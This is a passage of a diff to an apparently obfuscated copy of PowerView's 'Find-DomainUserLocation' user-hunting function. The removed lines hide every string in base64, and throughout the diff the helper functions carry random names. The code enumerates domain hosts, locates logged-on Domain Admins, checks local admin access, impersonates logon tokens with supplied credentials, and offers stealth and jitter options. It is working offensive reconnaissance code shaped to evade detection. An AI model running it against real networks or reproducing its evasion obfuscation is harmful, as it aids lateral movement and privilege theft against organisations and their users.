+        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
+        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
+        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
+        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
+        if ($PSBoundParameters['UserAllowDelegation']) { $UserSearcherArguments['AllowDelegation'] = $UserAllowDelegation }
+        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
 
         $TargetComputers = @()
 
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
+        if ($PSBoundParameters['ComputerName']) {
             $TargetComputers = @($ComputerName)
         }
         else {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RlYWx0aA==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBTdGVhbHRoIGVudW1lcmF0aW9uIHVzaW5nIHNvdXJjZTogJFN0ZWFsdGhTb3VyY2U=")))
+            if ($PSBoundParameters['Stealth']) {
+                Write-Verbose "[Find-DomainUserLocation] Stealth enumeration using source: $StealthSource"
                 $TargetComputerArrayList = New-Object System.Collections.ArrayList
 
-                if ($StealthSource -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsZXxBbGw=")))) {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgZmlsZSBzZXJ2ZXJz")))
+                if ($StealthSource -match 'File|All') {
+                    Write-Verbose '[Find-DomainUserLocation] Querying for file servers'
                     $FileServerSearcherArguments = @{}
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-                    $FileServers = xgedtj @FileServerSearcherArguments
+                    if ($PSBoundParameters['Domain']) { $FileServerSearcherArguments['Domain'] = $Domain }
+                    if ($PSBoundParameters['ComputerDomain']) { $FileServerSearcherArguments['Domain'] = $ComputerDomain }
+                    if ($PSBoundParameters['ComputerSearchBase']) { $FileServerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+                    if ($PSBoundParameters['Server']) { $FileServerSearcherArguments['Server'] = $Server }
+                    if ($PSBoundParameters['SearchScope']) { $FileServerSearcherArguments['SearchScope'] = $SearchScope }
+                    if ($PSBoundParameters['ResultPageSize']) { $FileServerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+                    if ($PSBoundParameters['ServerTimeLimit']) { $FileServerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+                    if ($PSBoundParameters['Tombstone']) { $FileServerSearcherArguments['Tombstone'] = $Tombstone }
+                    if ($PSBoundParameters['Credential']) { $FileServerSearcherArguments['Credential'] = $Credential }
+                    $FileServers = ynorqw @FileServerSearcherArguments
                     if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
                     $TargetComputerArrayList.AddRange( $FileServers )
                 }
-                if ($StealthSource -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REZTfEFsbA==")))) {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgREZTIHNlcnZlcnM=")))
+                if ($StealthSource -match 'DFS|All') {
+                    Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'
                     
                     
                 }
-                if ($StealthSource -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REN8QWxs")))) {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgZG9tYWluIGNvbnRyb2xsZXJz")))
+                if ($StealthSource -match 'DC|All') {
+                    Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'
                     $DCSearcherArguments = @{
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA=="))) = $True
+                        'LDAP' = $True
                     }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-                    $DomainControllers = wrqkwt @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
+                    if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
+                    if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }
+                    if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
+                    if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
+                    $DomainControllers = fbcyey @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                     if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                     $TargetComputerArrayList.AddRange( $DomainControllers )
                 }
                 $TargetComputers = $TargetComputerArrayList.ToArray()
             }
             else {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgYWxsIGNvbXB1dGVycyBpbiB0aGUgZG9tYWlu")))
-                $TargetComputers = aglnim @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+                Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'
+                $TargetComputers = auxvef @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
             }
         }
-        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiB7MH0="))) -f $($TargetComputers.Length))
+        Write-Verbose ("[Find-DomainUserLocation] TargetComputers length: {0}" -f $($TargetComputers.Length))
         if ($TargetComputers.Length -eq 0) {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBObyBob3N0cyBmb3VuZCB0byBlbnVtZXJhdGU=")))
+            throw '[Find-DomainUserLocation] No hosts found to enumerate'
         }
 
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
+        if ($PSBoundParameters['Credential']) {
             $CurrentUser = $Credential.GetNetworkCredential().UserName
         }
         else {
@@ -10336,31 +10340,31 @@ function hoszyu {
         }
 
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2hvd0FsbA==")))]) {
+        if ($PSBoundParameters['ShowAll']) {
             $TargetUsers = @()
         }
-        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFsbG93RGVsZWdhdGlvbg==")))]) {
-            $TargetUsers = cqaorm @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
+        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
+            $TargetUsers = ykrker @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
         }
         else {
             $GroupSearcherArguments = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $UserGroupIdentity
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjdXJzZQ=="))) = $True
+                'Identity' = $UserGroupIdentity
+                'Recurse' = $True
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-            $TargetUsers = dfkygh @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
+            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
+            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
+            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
+            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
+            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
+            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
+            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
+            $TargetUsers = yimpvw @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
         }
 
-        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXRVc2VycyBsZW5ndGg6IHswfQ=="))) -f $($TargetUsers.Length))
+        Write-Verbose ("[Find-DomainUserLocation] TargetUsers length: {0}" -f $($TargetUsers.Length))
         if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBObyB1c2VycyBmb3VuZCB0byB0YXJnZXQ=")))
+            throw '[Find-DomainUserLocation] No users found to target'
         }
 
         
@@ -10369,81 +10373,81 @@ function hoszyu {
 
             if ($TokenHandle) {
                 
-                $Null = jgnbzn -TokenHandle $TokenHandle -Quiet
+                $Null = kckfvi -TokenHandle $TokenHandle -Quiet
             }
 
             ForEach ($TargetComputer in $ComputerName) {
                 $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
-                    $Sessions = sgkkys -ComputerName $TargetComputer
+                    $Sessions = vfgybe -ComputerName $TargetComputer
                     ForEach ($Session in $Sessions) {
                         $UserName = $Session.UserName
                         $CName = $Session.CName
 
-                        if ($CName -and $CName.StartsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))) {
-                            $CName = $CName.TrimStart(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
+                        if ($CName -and $CName.StartsWith('\\')) {
+                            $CName = $CName.TrimStart('\')
                         }
 
                         
-                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQk"))))) {
+                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\$$')) {
 
                             if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                 $UserLocation = New-Object PSObject
-                                $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $Null
-                                $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
-                                $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $TargetComputer
-                                $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb20="))) $CName
+                                $UserLocation | Add-Member Noteproperty 'UserDomain' $Null
+                                $UserLocation | Add-Member Noteproperty 'UserName' $UserName
+                                $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
+                                $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName
 
                                 
                                 try {
                                     $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
-                                    $UserLocation | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb21OYW1l"))) $CnameDNSName
+                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName
                                 }
                                 catch {
-                                    $UserLocation | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb21OYW1l"))) $Null
+                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null
                                 }
 
                                 
                                 if ($CheckAccess) {
-                                    $Admin = (gsoflb -ComputerName $CName).IsAdmin
-                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Admin.IsAdmin
+                                    $Admin = (asbepi -ComputerName $CName).IsAdmin
+                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                 }
                                 else {
-                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Null
+                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                 }
-                                $UserLocation.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlVzZXJMb2NhdGlvbg=="))))
+                                $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                 $UserLocation
                             }
                         }
                     }
                     if (-not $Stealth) {
                         
-                        $LoggedOn = imvodn -ComputerName $TargetComputer
+                        $LoggedOn = falrkd -ComputerName $TargetComputer
                         ForEach ($User in $LoggedOn) {
                             $UserName = $User.UserName
                             $UserDomain = $User.LogonDomain
 
                             
                             if (($UserName) -and ($UserName.trim() -ne '')) {
-                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQk"))))) {
-                                    $IPAddress = @(rcuisx -ComputerName $TargetComputer)[0].IPAddress
+                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\$$')) {
+                                    $IPAddress = @(rwxsjr -ComputerName $TargetComputer)[0].IPAddress
                                     $UserLocation = New-Object PSObject
-                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $UserDomain
-                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
-                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $TargetComputer
-                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SVBBZGRyZXNz"))) $IPAddress
-                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb20="))) $Null
-                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb21OYW1l"))) $Null
+                                    $UserLocation | Add-Member Noteproperty 'UserDomain' $UserDomain
+                                    $UserLocation | Add-Member Noteproperty 'UserName' $UserName
+                                    $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
+                                    $UserLocation | Add-Member Noteproperty 'IPAddress' $IPAddress
+                                    $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null
+                                    $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null
 
                                     
                                     if ($CheckAccess) {
-                                        $Admin = gsoflb -ComputerName $TargetComputer
-                                        $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Admin.IsAdmin
+                                        $Admin = asbepi -ComputerName $TargetComputer
+                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                     }
                                     else {
-                                        $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Null
+                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                     }
-                                    $UserLocation.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlVzZXJMb2NhdGlvbg=="))))
+                                    $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                     $UserLocation
                                 }
                             }
@@ -10453,27 +10457,27 @@ function hoszyu {
             }
 
             if ($TokenHandle) {
-                husafk
+                njmybn
             }
         }
 
         $LogonToken = $Null
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
-                $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
+                $LogonToken = kckfvi -Credential $Credential
             }
             else {
-                $LogonToken = jgnbzn -Credential $Credential -Quiet
+                $LogonToken = kckfvi -Credential $Credential -Quiet
             }
         }
     }
 
     PROCESS {
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
+        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6IHswfQ=="))) -f $($TargetComputers.count))
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXI=")))
+            Write-Verbose ("[Find-DomainUserLocation] Total number of hosts: {0}" -f $($TargetComputers.count))
+            Write-Verbose "[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
@@ -10483,41 +10487,41 @@ function hoszyu {
                 
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBFbnVtZXJhdGluZyBzZXJ2ZXIgJENvbXB1dGVyICgkQ291bnRlciBvZiB7MH0p"))) -f $($TargetComputers.Count))
+                Write-Verbose ("[Find-DomainUserLocation] Enumerating server $Computer ($Counter of {0})" -f $($TargetComputers.Count))
                 Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken
 
                 if ($Result -and $StopOnSuccess) {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXQgdXNlciBmb3VuZCwgcmV0dXJuaW5nIGVhcmx5")))
+                    Write-Verbose "[Find-DomainUserLocation] Target user found, returning early"
                     return
                 }
             }
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBVc2luZyB0aHJlYWRpbmcgd2l0aCB0aHJlYWRzOiAkVGhyZWFkcw==")))
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiB7MH0="))) -f $($TargetComputers.Length))
+            Write-Verbose "[Find-DomainUserLocation] Using threading with threads: $Threads"
+            Write-Verbose ("[Find-DomainUserLocation] TargetComputers length: {0}" -f $($TargetComputers.Length))
 
             
             $ScriptParams = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0VXNlcnM="))) = $TargetUsers
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3VycmVudFVzZXI="))) = $CurrentUser
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RlYWx0aA=="))) = $Stealth
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU="))) = $LogonToken
+                'TargetUsers' = $TargetUsers
+                'CurrentUser' = $CurrentUser
+                'Stealth' = $Stealth
+                'TokenHandle' = $LogonToken
             }
 
             
-            payhcg -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            umwnhz -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function meumav {
+function xgstnn {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -10595,7 +10599,7 @@ function meumav {
         [ValidateNotNullOrEmpty()]
         [Alias('GroupName', 'Group')]
         [String[]]
-        $UserGroupIdentity = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIEFkbWlucw=="))),
+        $UserGroupIdentity = 'Domain Admins',
 
         [Parameter(ParameterSetName = 'TargetUser')]
         [Alias('AdminCount')]
@@ -10609,7 +10613,7 @@ function meumav {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -10644,81 +10648,81 @@ function meumav {
 
     BEGIN {
         $ComputerSearcherArguments = @{
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
+            'Properties' = 'dnshostname'
         }
